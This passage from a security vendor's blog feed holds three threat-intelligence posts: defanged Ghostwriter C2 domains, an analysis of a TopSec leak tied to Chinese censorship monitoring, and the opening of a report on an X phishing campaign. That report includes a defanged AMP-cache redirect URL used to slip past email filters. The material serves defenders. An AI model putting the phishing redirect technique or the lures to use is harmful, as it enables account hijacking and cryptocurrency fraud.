зразок.xls\n\n\nebb30fd99c2e6cbae392c337df5876759e53730d\nполитзаключенные (по судам минска).xls\n\n\n\n\nDownloaders\nLibCMD helper file\nC2 Domains\namericandeliriumsociety[.]shop\ncookingwithbooks[.]shop\neverythingandthedog[.]shop\npigglywigglystores[.]shop\nsciencealert[.]shop","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter-ftr.jpg","length":"411675","type":"image/jpeg"},"dc:creator":"Tom Hegel","content":"Latest Ghostwriter campaign brings Belarusian opposition into its sights for the first time as it continues weaponizing XLS docs to drop malware.","contentSnippet":"Latest Ghostwriter campaign brings Belarusian opposition into its sights for the first time as it continues weaponizing XLS docs to drop malware.","guid":"https://www.sentinelone.com/?post_type=labs&p=114319","categories":["Belarus","Russia","Ukraine"],"isoDate":"2025-02-25T10:55:52.000Z","tag":"intel"},{"creator":"Alex Delamotte, Aleksandar Milenkoski &amp; Dakota Cary","title":"Censorship as a Service | Leak Reveals Public-Private Collaboration to Monitor Chinese Cyberspace","link":"https://www.sentinelone.com/labs/censorship-as-a-service-leak-reveals-public-private-collaboration-to-monitor-chinese-cyberspace/","pubDate":"Fri, 21 Feb 2025 10:55:35 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">SentinelLABS has analyzed a data leak containing infrastructure details and work logs from employees of a state-affiliated private sector security firm in China.</li>\n<li aria-level=\"1\">The leaked data contains references to web content monitoring services used to enforce censorship for public and private sector customers.</li>\n<li aria-level=\"1\">Work logs reveal that the firm provided bespoke monitoring services to a state-owned enterprise when a corruption scandal impacted this organization, providing insights into how the state and CCP coordinate with some cybersecurity companies to manage fallout from corruption scandals.</li>\n</ul>\n<h2>Overview</h2>\n<p>SentinelLABS has analyzed a data leak from TopSec (北京天融), a Chinese cybersecurity firm offering services such as Endpoint Detection &amp; Response (EDR) and vulnerability scanning, while offering boutique solutions to align with government initiatives and intelligence requirements.</p>\n<p>The data leak includes a document with 7,000+ lines of work logs and code used to orchestrate infrastructure for the firm’s DevOps practices and downstream customers and includes scripts that connect to several Chinese government hostnames, academic institutions and news sites.</p>\n<p>We identified work logs and system features that indicate TopSec is likely enabling content moderation for internet censorship purposes, a key <a href=\"https://www.atlanticcouncil.org/in-depth-research-reports/report/community-watch-chinas-vision-for-the-future-of-the-internet/\">strategy</a> used by the Chinese Communist Party (CCP) to monitor and control public opinion on issues that the state deems contentious or antisocial.</p>\n<p>Further, we found evidence indicating that TopSec provided bespoke services to a state-owned enterprise on the date that a corruption investigation was announced targeting the organization’s top official.</p>\n<p>The Chinese cybersecurity market has long been a mystery for many researchers in the west.

This finding reveals not only the types of technologies that are used by a prestigious Chinese tech firm, but how they are providing security services to private and public sector customers inside China.</p>\n<h2>TopSec</h2>\n<p>TopSec is a provider of monitoring and IT security solutions, as well as big data and cloud services. Established in 1995, TopSec prides itself on its long history and prioritizes national cyberspace security as a core element of its mission statement.</p>\n<p>Company registration details reveal that TopSec holds over 1,000 patents, 87 software copyrights, and has 12 subsidiaries. The company is also a <a href=\"https://www.atlanticcouncil.org/in-depth-research-reports/report/sleight-of-hand-how-china-weaponizes-software-vulnerability/\">Tier 1 vulnerability supplier</a> to China’s civilian intelligence ministry. According to TopSec&#8217;s 2024 annual corporate report for shareholders, the company has been offering cloud monitoring services–including IT security monitoring capabilities–since 2004. By 2020, these TopSec services were in use across all 31 of China’s administrative regions.</p>\n<p><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7.jpg\" alt=\"Description of TopSec services\" width=\"1999\" height=\"128\" class=\"aligncenter size-full wp-image-114588\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-300x19.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-1024x66.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-768x49.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-1536x98.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><br />\n<figure id=\"attachment_114604\" aria-describedby=\"caption-attachment-114604\" style=\"width: 696px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08.jpg\" alt=\"Description of TopSec services\" width=\"696\" height=\"130\" class=\"size-full wp-image-114604\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08.jpg 696w, https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08-300x56.jpg 300w\" sizes=\"auto, (max-width: 696px) 100vw, 696px\" /><figcaption id=\"caption-attachment-114604\" class=\"wp-caption-text\">Description of TopSec services</figcaption></figure></p>\n<p><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg\" alt=\"\" width=\"1999\" height=\"683\" class=\"aligncenter size-full wp-image-114591\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-300x103.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-1024x350.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-768x262.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-1536x525.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><br />\n<figure id=\"attachment_114600\" aria-describedby=\"caption-attachment-114600\" style=\"width: 782px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg\" alt=\"TopSec&#039;s 2024 annual corporate report\" width=\"782\" height=\"266\" class=\"size-full wp-image-114600\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg 782w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12-300x102.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12-768x261.jpg 768w\" sizes=\"auto, (max-width: 782px) 100vw, 782px\" /><figcaption id=\"caption-attachment-114600\" class=\"wp-caption-text\">TopSec&#8217;s 2024 annual corporate report (<a href=\"https://file.finance.sina.com.cn/211.154.219.97:9494/MRGG/CNSESZ_STOCK/2024/2024-4/2024-04-20/10013439.PDF\" target=\"_blank\">Source</a>)</figcaption></figure></p>\n<p>The leaked documents we analyzed reference multiple organizations in both the private and public sectors, likely customers or otherwise associated with TopSec, a selection of which is listed below.

There are many artifacts showing JSON data for web APIs used by TopSec services. There are also network configurations, SSH and port mapping commands with hardcoded credentials, which present a huge security risk should anyone obtain access to the environment–and would likely provide access to TopSec’s downstream customers as well.</p>\n<figure id=\"attachment_114598\" aria-describedby=\"caption-attachment-114598\" style=\"width: 686px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg\" alt=\"Ansible commands from leaked file used to access infrastructure\" width=\"686\" height=\"190\" class=\"size-full wp-image-114598\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14.jpg 686w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_14-300x83.jpg 300w\" sizes=\"auto, (max-width: 686px) 100vw, 686px\" /><figcaption id=\"caption-attachment-114598\" class=\"wp-caption-text\">Ansible commands from leaked file used to access infrastructure</figcaption></figure>\n<p>The leaked file is very large, disorganized, and the formatting is inconsistent, which complicates analysis. It is highly likely that we have not identified all capabilities outlined in the leak. Our analysis approach focused on translating the Chinese language content, identifying known technologies, and identifying interesting references in the commands and API JSON artifacts, particularly those where there were upticks in work logs performed around specific dates documented in the work logs or web API data.</p>\n<p>The data leak includes a file that starts with infrastructure management code, including some which initializes several Docker images to enable security monitoring related features. These containers run probes, which are likely used for network monitoring. We are unable to fully assess the capabilities of these containers without access to them. However, the containers are run with several flags such as <code>--privileged</code> and <code>--net host</code> that suggest deep access to the monitored data. This may indicate the probes inspect network traffic or perform privileged tasks in the deployment environment.</p>\n<p>Deeper in the file, there are work logs which contain dates indicating when certain tasks were performed and notes from the TopSec staff who worked on specific infrastructure projects. One project referenced repeatedly is called Sparta or Sparda, with the spelling changing regularly. Notes from the TopSec staff indicate that Sparta handles sensitive word processing, an indication of censorship keyword monitoring.</p>\n<p>On a technical level, Sparta is a framework that uses GraphQL APIs to receive content from downstream web applications. Work logs indicate that TopSec migrated from a system called Apollo, which is plausibly a reference to <a href=\"https://github.com/apollographql\">Apollo-GraphQL</a>, an open-source framework offered by a company based in San Francisco. The work logs also indicate that Sparta is equipped to process Chinese language characters. This suggests that TopSec likely developed Sparta as an in-house solution that is tailored to the localized needs of TopSec’s customers and does not rely on a US-based solution.</p>\n<p>Additionally, we observed a note indicating that detection alerts considered severe are likely distributed to internal teams via WeChat for prioritized handling. WeChat is a widely-used messaging and social media platform in China, known for its broad range of features, including messaging, social networking, and payment services. Its integration into daily life makes it an essential tool for communication and business operations within the country.</p>\n<pre>\r\nSevere monitoring events are sent to corporate WeChat\r\n</pre>\n<p>Since WeChat operates under Chinese regulations, there are significant implications regarding data privacy and government access. Under Chinese laws, such as the <a href=\"https://digichina.stanford.edu/work/translation-cybersecurity-law-of-the-peoples-republic-of-china-effective-june-1-2017/\">Cybersecurity Law</a>, companies like Tencent, which owns WeChat, are required to cooperate with government entities, allowing them to access data when requested.</p>\n<h2>Web Content Monitoring</h2>\n<p>Our analysis found that TopSec’s capabilities include web content monitoring, as indicated by references to a service called <code>Website Monitoring Service</code> and detection events with internal identifiers prefixed with <code>Web</code>, such as <code>WebTamper</code>, <code>WebHiddenLink</code>, <code>WebAvailHttp</code>, <code>WebDns</code>, <code>WebTr</code>, and <code>WebSensitive</code>.</p>\n<p>This feature of the platform is likely part of what would have been proposed in response to the bid issued by the Shanghai Pudong Bureau for the &#8220;Cloud Monitoring Service Project&#8221;, offering the Bureau tools to monitor website security and content as part of their broader surveillance and compliance efforts.</p>\n<pre>\r\nInspect website monitoring-related services\r\n[ . . . ]\r\n[2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553] 2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553\r\nWebSensitive 56\r\nWebTamper 149\r\nWebHiddenLink 348\r\n</pre>\n<p>While the exact logic behind how the Web events are triggered remains unclear, the event names and metadata present in the documents provide insight into the purpose of some of these events. For instance, the <code>WebAvailHttp</code> event is likely triggered when a website is considered unavailable due to its response time (measured in milliseconds as <code>respTimeMs</code> in the figure below) exceeding a predefined threshold (<code>respThresholdMs</code>).</p>\n<figure id=\"attachment_114595\" aria-describedby=\"caption-attachment-114595\" style=\"width: 330px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg\" alt=\"Metadata on the WebAvailHttp event\" width=\"330\" height=\"357\" class=\"size-full wp-image-114595\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg 330w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17-277x300.jpg 277w\" sizes=\"auto, (max-width: 330px) 100vw, 330px\" /><figcaption id=\"caption-attachment-114595\" class=\"wp-caption-text\">Metadata on the <em>WebAvailHttp</em> event</figcaption></figure>\n<p>Further, the <code>WebHiddenLink</code> event is likely triggered when web content contains hidden links — links that obscure their destination or mislead users, posing a security risk.

These words are related to political criticism, violence, or pornography, and are central to China&#8217;s domestic Internet censorship efforts aimed at ensuring compliance with government policies.

These policies shape the strategies and technologies used to monitor, filter, and control online content, ensuring that IT systems comply with governmental regulations and censorship guidelines.</p>\n<p><code>WebSensitive</code> alerts may be used by private sector organizations to monitor user-generated content on their websites in order to trigger actions such as issuing warnings, deleting content, or restricting access when sensitive words are detected. Government entities may also consume these alerts to track the presence of sensitive words on their own websites or across broader online spaces to enforce compliance with national censorship regulations. For example, the latter may have been an objective of the previously mentioned &#8220;Cloud Monitoring Service Project&#8221; by the Shanghai Pudong Bureau of the Ministry of Public Security.</p>\n<p>We observed a task list indicating a focused effort to ensure consistent monitoring for sensitive words between 7:00 AM and 8:00 AM on the 14th (converted from GMT to China Standard Time), with the month and year not specified. The preceding document content suggests that the reference is to September 2023. One item in the task list instructs verification of the availability and capacity of sensitive word detection capabilities during this period, while another item records the forwarding of &#8216;asset identifiers&#8217; for collected &#8216;validated events&#8217; to an individual named Zhao Nannan (赵楠楠).

While many countries have significant overlap between government requirements and private sector cybersecurity firms, the ties between these entities in China are much deeper and represent the state’s grasp on managing public opinion through online enforcement.</p>\n<p>The September 2023 situation in Shanghai provides insight into how local and national government interests are enforced through private sector partnerships. The CCP’s strategy of controlling information is multifaceted and requires significant investment in resources that enable the monitoring and alteration of content that citizens engage with. While there are still many unknown factors regarding how such censorship is applied, these findings yield insights into how collaboration occurs between the government and other entities in China.</p>\n<p>The nature of how this data was leaked remains unclear, but the materials show that TopSec engineers were documenting their work in a highly granular way that included entire commands used to perform the outlined tasks. Considering the types of information in this leak, organizations should evaluate how their systems and infrastructure engineers are logging work. Proper credential management is essential to securing sensitive environments. Infrastructure engineers should rely on a secrets manager that integrates with the CI/CD pipeline rather than running commands from playbooks that include hardcoded credentials. This results in only variable names being stored in commands instead of sensitive credentials and lowers the likelihood that an unexpected disclosure could result in further compromise.</p>\n","content:encodedSnippet":"Executive Summary\nSentinelLABS has analyzed a data leak containing infrastructure details and work logs from employees of a state-affiliated private sector security firm in China.\nThe leaked data contains references to web content monitoring services used to enforce censorship for public and private sector customers.\nWork logs reveal that the firm provided bespoke monitoring services to a state-owned enterprise when a corruption scandal impacted this organization, providing insights into how the state and CCP coordinate with some cybersecurity companies to manage fallout from corruption scandals.\nOverview\nSentinelLABS has analyzed a data leak from TopSec (北京天融), a Chinese cybersecurity firm offering services such as Endpoint Detection & Response (EDR) and vulnerability scanning, while offering boutique solutions to align with government initiatives and intelligence requirements.\nThe data leak includes a document with 7,000+ lines of work logs and code used to orchestrate infrastructure for the firm’s DevOps practices and downstream customers and includes scripts that connect to several Chinese government hostnames, academic institutions and news sites.\nWe identified work logs and system features that indicate TopSec is likely enabling content moderation for internet censorship purposes, a key strategy used by the Chinese Communist Party (CCP) to monitor and control public opinion on issues that the state deems contentious or antisocial.\nFurther, we found evidence indicating that TopSec provided bespoke services to a state-owned enterprise on the date that a corruption investigation was announced targeting the organization’s top official.\nThe Chinese cybersecurity market has long been a mystery for many researchers in the west. Unlike Europe and parts of the Middle East, which foster some degree of collaboration, the Chinese cybersecurity market is obscured behind the wall that divides China from the global internet. This finding reveals not only the types of technologies that are used by a prestigious Chinese tech firm, but how they are providing security services to private and public sector customers inside China.\nTopSec\nTopSec is a provider of monitoring and IT security solutions, as well as big data and cloud services. Established in 1995, TopSec prides itself on its long history and prioritizes national cyberspace security as a core element of its mission statement.\nCompany registration details reveal that TopSec holds over 1,000 patents, 87 software copyrights, and has 12 subsidiaries. The company is also a Tier 1 vulnerability supplier to China’s civilian intelligence ministry. According to TopSec’s 2024 annual corporate report for shareholders, the company has been offering cloud monitoring services–including IT security monitoring capabilities–since 2004. By 2020, these TopSec services were in use across all 31 of China’s administrative regions.\n\nDescription of TopSec services\n\nTopSec’s 2024 annual corporate report (Source)\nThe leaked documents we analyzed reference multiple organizations in both the private and public sectors, likely customers or otherwise associated with TopSec, a selection of which is listed below. These references include probable deployment sites of monitoring probes and mentions in-work progress records.\nPublic sector organizations referenced in the documents include entities integral to China’s political system, such as the Municipal Commissions for Discipline Inspection, which enforce party regulations and investigate corruption. Another example is the Illegal and Harmful Information Reporting Center, an entity dedicated to combating what the Chinese Communist Party (CCP) considers illegal and harmful behavior in the online space. TopSec customers referenced in these documents include:\nDongwu Fund Management Co., Ltd\nGucheng County Petition Bureau\nIllegal and Harmful Information Reporting Center\nLinhai Rural Commercial Bank\nPetkit\nShanghai Diepai Automobile Technology Co\nShanghai Fengyilong Electronic\nShanghai Medical Packaging Materials Factory\nShanghai Municipal Commission for Discipline Inspection\nShanghai Municipal Supervisory Commission\nTibet Autonomous Region\nTibet Autonomous Region Committee of the Communist Party of China\nWuhu Discipline Inspection and Supervision Network\nWe observed references to three projects associated with Bureaus of the Ministry of Public Security in the northeastern city of Dandong, as well as the Songjiang and Pudong districts of Shanghai, with the latter project referred to as the “Cloud Monitoring Service Project”. The Ministry of Public Security is responsible for maintaining public order and overseeing law enforcement and surveillance activities to ensure compliance with national regulations.\n\r\n[2024-2025 Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project (Phase II)]\r\nThe statistics of events that occurred today are as follows:\r\nAggregated events: 883 Valid: 129 Invalid: 672 On-hand: 82\r\nSingle events: 5637 Valid: 187 Invalid: 2781 On-hand: 2669\r\nIn terms of event volume, it is basically the same as that of our competitors.\r\n\nA public procurement announcement for the “Cloud Monitoring Service Project” suggests that it involves monitoring the security posture and content of websites under the Bureaus’ jurisdiction, with alerts issued in case of security breaches or policy violations. TopSec was likely involved in the bidding process alongside competitor companies. Public documents, however, show TopSec did not win the contract.\nContract announcement  for Cloud Monitoring Service Project (Source)\nProcurement announcement for Cloud Monitoring Service Project (Source)\nInfrastructure Features\nWe identified this leak as a submission to a multi-scanner platform that fired off a rule that looks for common abuse activities associated with Kubernetes. The main file we analyzed (SHA-1: 1bccef07ad0348e326248fe321259e2bd8f8cf8b) contains numerous work logs, which are a description of the work performed by a TopSec employee and the amount of time the task took, often accompanied by scripts, commands, or data related to the task.\nExample of work logs from the file along with English translation\nIn addition to work logs, the leak contains many commands and playbooks used to administrate TopSec’s services via multiple common DevOps and infrastructure technologies that are used worldwide, including Ansible, Docker, ElasticSearch, Gitlab, Kafka, Kibana, Kubernetes, and Redis. There are many artifacts showing JSON data for web APIs used by TopSec services. There are also network configurations, SSH and port mapping commands with hardcoded credentials, which present a huge security risk should anyone obtain access to the environment–and would likely provide access to TopSec’s downstream customers as well.\nAnsible commands from leaked file used to access infrastructure\nThe leaked file is very large, disorganized, and the formatting is inconsistent, which complicates analysis. It is highly likely that we have not identified all capabilities outlined in the leak. Our analysis approach focused on translating the Chinese language content, identifying known technologies, and identifying interesting references in the commands and API JSON artifacts, particularly those where there were upticks in work logs performed around specific dates documented in the work logs or web API data.\nThe data leak includes a file that starts with infrastructure management code, including some which initializes several Docker images to enable security monitoring related features. These containers run probes, which are likely used for network monitoring. We are unable to fully assess the capabilities of these containers without access to them. However, the containers are run with several flags such as --privileged and --net host that suggest deep access to the monitored data. This may indicate the probes inspect network traffic or perform privileged tasks in the deployment environment.\nDeeper in the file, there are work logs which contain dates indicating when certain tasks were performed and notes from the TopSec staff who worked on specific infrastructure projects. One project referenced repeatedly is called Sparta or Sparda, with the spelling changing regularly. Notes from the TopSec staff indicate that Sparta handles sensitive word processing, an indication of censorship keyword monitoring.\nOn a technical level, Sparta is a framework that uses GraphQL APIs to receive content from downstream web applications. Work logs indicate that TopSec migrated from a system called Apollo, which is plausibly a reference to Apollo-GraphQL, an open-source framework offered by a company based in San Francisco. The work logs also indicate that Sparta is equipped to process Chinese language characters. This suggests that TopSec likely developed Sparta as an in-house solution that is tailored to the localized needs of TopSec’s customers and does not rely on a US-based solution.\nAdditionally, we observed a note indicating that detection alerts considered severe are likely distributed to internal teams via WeChat for prioritized handling. WeChat is a widely-used messaging and social media platform in China, known for its broad range of features, including messaging, social networking, and payment services. Its integration into daily life makes it an essential tool for communication and business operations within the country.\n\r\nSevere monitoring events are sent to corporate WeChat\r\n\nSince WeChat operates under Chinese regulations, there are significant implications regarding data privacy and government access. Under Chinese laws, such as the Cybersecurity Law, companies like Tencent, which owns WeChat, are required to cooperate with government entities, allowing them to access data when requested.\nWeb Content Monitoring\nOur analysis found that TopSec’s capabilities include web content monitoring, as indicated by references to a service called Website Monitoring Service and detection events with internal identifiers prefixed with Web, such as WebTamper, WebHiddenLink, WebAvailHttp, WebDns, WebTr, and WebSensitive.\nThis feature of the platform is likely part of what would have been proposed in response to the bid issued by the Shanghai Pudong Bureau for the “Cloud Monitoring Service Project”, offering the Bureau tools to monitor website security and content as part of their broader surveillance and compliance efforts.\n\r\nInspect website monitoring-related services\r\n[ . . . ]\r\n[2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553] 2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553\r\nWebSensitive 56\r\nWebTamper 149\r\nWebHiddenLink 348\r\n\nWhile the exact logic behind how the Web events are triggered remains unclear, the event names and metadata present in the documents provide insight into the purpose of some of these events. For instance, the WebAvailHttp event is likely triggered when a website is considered unavailable due to its response time (measured in milliseconds as respTimeMs in the figure below) exceeding a predefined threshold (respThresholdMs).\nMetadata on the WebAvailHttp event\nFurther, the WebHiddenLink event is likely triggered when web content contains hidden links — links that obscure their destination or mislead users, posing a security risk. Examples include links concealed within small or transparent elements, deceptive anchor text, and styling tricks that make links appear as plain text.\nThe WebHiddenLink event\nWeb Content Monitoring | Sensitive Words\nThe WebSensitive event is likely triggered when web content contains so-called sensitive words (敏感词 in Simplified Chinese). These words are related to political criticism, violence, or pornography, and are central to China’s domestic Internet censorship efforts aimed at ensuring compliance with government policies. Detecting the presence of such words in web content helps prevent the dissemination of information considered inappropriate or harmful by PRC authorities.\n\r\nAssist the product to check for missed scans and manual analysis and marking errors of sensitive word events\r\n\nTopSec’s ability to detect sensitive words demonstrates the impact that state policies related to the cyber domain have on the design and implementation of monitoring solutions developed by the private sector in China. These policies shape the strategies and technologies used to monitor, filter, and control online content, ensuring that IT systems comply with governmental regulations and censorship guidelines.\nWebSensitive alerts may be used by private sector organizations to monitor user-generated content on their websites in order to trigger actions such as issuing warnings, deleting content, or restricting access when sensitive words are detected. Government entities may also consume these alerts to track the presence of sensitive words on their own websites or across broader online spaces to enforce compliance with national censorship regulations. For example, the latter may have been an objective of the previously mentioned “Cloud Monitoring Service Project” by the Shanghai Pudong Bureau of the Ministry of Public Security.\nWe observed a task list indicating a focused effort to ensure consistent monitoring for sensitive words between 7:00 AM and 8:00 AM on the 14th (converted from GMT to China Standard Time), with the month and year not specified. The preceding document content suggests that the reference is to September 2023. One item in the task list instructs verification of the availability and capacity of sensitive word detection capabilities during this period, while another item records the forwarding of ‘asset identifiers’ for collected ‘validated events’ to an individual named Zhao Nannan (赵楠楠). The task list issuing this instruction very likely includes a typo stating the validated events were from 7:00 AM to 10:00 PM on September 14.\n\r\n1. \tPlan the probe deployment plan for the web split emergency milestone launch 3h\r\n2. \tCheck the number of agents for sensitive words between 23:00 on the 13th (GMT) and 14:00 at 00:00 (排查敏感词13日23点到14点0点之间的代办数量) 2h\r\n3. \tCheck cloud baseline 500 errors 1h\r\n4. \tCollect asset identifiers of valid events on the 13th and provide them to Zhao Nannan 1h\r\n5. \tCheck the task execution failure of ipv6 probe 1h\r\n\nDocument excerpts indicating sensitive web content actions in September 2023\nThe identification of an individual named Zhao Nannan as the likely recipient of this information, alongside the context of the monitoring effort, leads us to conclude with moderate confidence that this effort was in response to political events in Shanghai.\nWe identified a woman named Zhao Nannan as having worked at the 3rd Bureau of the Ministry of Public Security in Shanghai, which is responsible for network security and technical investigations. Our observations presented earlier in this post suggest close ties between Shanghai-based Bureaus of the Ministry of Public Security and TopSec, one example being TopSec’s participation in a project bidding process launched by the Shanghai Pudong Bureau.\n\nEmployment affiliation of Zhao Nannan (Source: LinkedIn)\nHowever, Zhao Nannan no longer works for the MPS 3rd Bureau in Shanghai. According to an online announcement from the Shanghai State-owned Assets Supervision and Administration Commission (SASAC), Zhao Nannan was one of six successful applicants to SASAC for a network security role. The announcement even references her past role at the MPS 3rd Bureau. Congratulations are due to her, as she scored the highest among the applicants for the role–恭喜!\n\nZhao Nannan’s role at Shanghai SASA (Source)\nOn the morning of September 14th, when Zhao Nannan received alerts for sensitive content, her new employer announced on its WeChat account that the head of the Shanghai SASAC, Bai Tinghui, was under investigation for corruption. The news was quickly picked up by the South China Morning Post, Caixing, and other news-reposting blogs in China. The Shanghai government itself confirmed the investigation into Bai Tinghui and his subsequent dismissal one month later.\nNews coverage on Bai Tinghui’s investigation (Source)\nGovernment confirmation of Bai Tinghui’s dismissal (Source)\nBecause the Shanghai SASAC posted the news on WeChat, we know that the investigation itself was not subject to censorship. The lack of complete censorship regarding the investigation raises questions about what “validated events” would have been reported to Zhao Nannan following the announcement.\nCurrently, only five webpages of the Shanghai SASAC still mention Bai Tinghui. All five pages also mention Bai leading a Party study session of Xi Jinping Thought. It’s unclear why only these pages of Bai Tinghui remain–perhaps his tarnished reputation is outshown by Xi Jinping: it may be hard to delete a website with Xi Jinping’s name on it, even if it is accompanied by a corrupt local official.\nSearch results that still show Bai Tinghui’s name on SASAC website\nIntriguingly, the organization that is responsible for investigating the fallen Bai Tinghui, the Shanghai Municipal Commission for Discipline Inspection, is listed among TopSec’s customers in the tooling.\nThe downfall of Bai Tinghui and the resulting use of Beijing TopSec’s tooling for coordinated monitoring of politically sensitive content shines a light on the important role cybersecurity companies can play in Chinese politics. The CCP has long-acknowledged that “If our party cannot traverse the hurdle represented by the Internet, it cannot traverse the hurdle of remaining in power for the long term.” This episode provides a compelling example of how corruption investigations expand to rely on the institutions of those being investigated and the cybersecurity companies that service them.\nConclusion\nThese leaks yield insight into the complex ecosystem of relationships between government entities and China’s private sector cybersecurity companies. While many countries have significant overlap between government requirements and private sector cybersecurity firms, the ties between these entities in China are much deeper and represent the state’s grasp on managing public opinion through online enforcement.\nThe September 2023 situation in Shanghai provides insight into how local and national government interests are enforced through private sector partnerships. The CCP’s strategy of controlling information is multifaceted and requires significant investment in resources that enable the monitoring and alteration of content that citizens engage with. While there are still many unknown factors regarding how such censorship is applied, these findings yield insights into how collaboration occurs between the government and other entities in China.\nThe nature of how this data was leaked remains unclear, but the materials show that TopSec engineers were documenting their work in a highly granular way that included entire commands used to perform the outlined tasks. Considering the types of information in this leak, organizations should evaluate how their systems and infrastructure engineers are logging work. Proper credential management is essential to securing sensitive environments. Infrastructure engineers should rely on a secrets manager that integrates with the CI/CD pipeline rather than running commands from playbooks that include hardcoded credentials. This results in only variable names being stored in commands instead of sensitive credentials and lowers the likelihood that an unexpected disclosure could result in further compromise.","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/02/CasS-Leaks-ftr.jpg","length":"604370","type":"image/jpeg"},"dc:creator":"Alex Delamotte, Aleksandar Milenkoski &amp; Dakota Cary","content":"Data leak reveals how a top tier cybersecurity vendor helps the PRC enforce content monitoring and manipulation of public opinion in China.","contentSnippet":"Data leak reveals how a top tier cybersecurity vendor helps the PRC enforce content monitoring and manipulation of public opinion in China.","guid":"https://www.sentinelone.com/?post_type=labs&p=114581","categories":["China"],"isoDate":"2025-02-21T10:55:35.000Z","tag":"intel"},{"creator":"Tom Hegel, Jim Walter &amp; Alex Delamotte","title":"X Phishing | Campaign Targeting High Profile Accounts Returns, Promoting Crypto Scams","link":"https://www.sentinelone.com/labs/phishing-on-x-high-profile-account-targeting-campaign-returns/","pubDate":"Fri, 31 Jan 2025 14:55:46 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li>An active phishing campaign is targeting high-profile X accounts in an attempt to hijack and exploit them for fraudulent activity.</li>\n<li>This campaign has been observed targeting a variety of individual and organization accounts such as U.S. political figures, leading international journalists, an X employee, large technology organizations, cryptocurrency organizations, and owners of valuable, short usernames.</li>\n<li>SentinelLABS’ analysis links this activity to a similar operation from last year that successfully compromised multiple accounts to spread scam content with financial objectives.

The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.</p>\n<p>Inspecting the DNS history of <code>84.38.130[.]20</code> leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today.

While the activity detailed here is centered around X/Twitter accounts, this actor is not limited to a single social platform, and can be observed directing attention to other popular services as well, while seemingly pursuing the same financial objectives.\nIf you’ve encountered similar suspicious activity, SentinelLABS would love to hear from you — please reach out to the team at ThreatTips@sentinelone.com.\nAccount Compromise Process\nThanks to tips from targets and collaboration with industry partners, SentinelLABS has observed a variety of phishing lures tied to this campaign over the past few weeks. One example is the classic account login notice. The links in the email received by the target are not legitimate and lead to credential phishing sites. Other observed lures use copyright violation themes. However, SentinelLABS notes that directly phishing users may not be the only access method employed by this attacker.\nAn X ‘new login’-themed phishing email\nIn recent cases, we observed the actor abusing Google’s “AMP Cache” domain cdn.ampproject[.]org to evade email detections and redirect the user to a phishing domain:\nhttps://cdn.ampproject[.]org/c/s/x-recoverysupport.com/reset/?username=[X-USERNAME]\nThis ultimately leads the targets to an actor-made phishing website seeking X account credentials:\nX credential phishing page\nIn the copyright infringement lure scenario, the user will first visit an Action Needed page before being prompted to enter credentials:\nX fake copyright infringement page\nOnce an account is taken over, the attacker swiftly locks out the legitimate owner and begins posting fraudulent cryptocurrency opportunities or links to external sites designed to lure additional targets, often with a crypto theft-related theme. Ultimately, compromising high-profile accounts enables the attacker to reach a broader audience of potential secondary victims, maximizing their financial gains.\nWidespread Activity\nIn recent activity associated with this campaign, the domain securelogins-x[.]com has been used to deliver emails and x-recoverysupport[.]com to host phishing pages. Our observations indicate a level of informality and flexibility of infrastructure use – meaning any of these domains can be considered email delivery or phishing page hosting.\nAn overall collection of recent activity can be observed hosted on 84.38.130[.]20, an IP associated with a Belize-based VPS service called Dataclub. The domains themselves have been predominantly registered through Turkish hosting provider Turkticaret.\nInspecting the DNS history of 84.38.130[.]20 leads to a variety of interestingly related domains. As shown below, the cluster of activity began in mid-2024 and continues today. While this is only one 